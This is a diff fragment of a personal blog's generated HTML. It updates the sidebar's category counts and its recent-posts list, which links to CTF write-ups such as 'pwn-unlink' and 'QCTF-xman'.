+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
     </div>
   </aside>
 
@@ -775,6 +789,10 @@
     <h3 class="widget-title">Recents</h3>
     <div class="widget-content">
       <ul>
+        
+          <li>
+            <a href="/2018/07/25/pwn-unlink/">pwn-unlink</a>
+          </li>
         
           <li>
             <a href="/2018/07/16/QCTF-xman/">QCTF-xman</a>
@@ -790,10 +808,6 @@
         
           <li>
             <a href="/2018/04/13/HITBCTF2018-reverse-hex/">HITBCTF2018-reverse-hex</a>
-          </li>
-        
-          <li>
-            <a href="/2018/03/20/Play-Rtsp-Stream-opencv2/">Play Rtsp Stream-opencv2</a>
           </li>
         
       </ul>
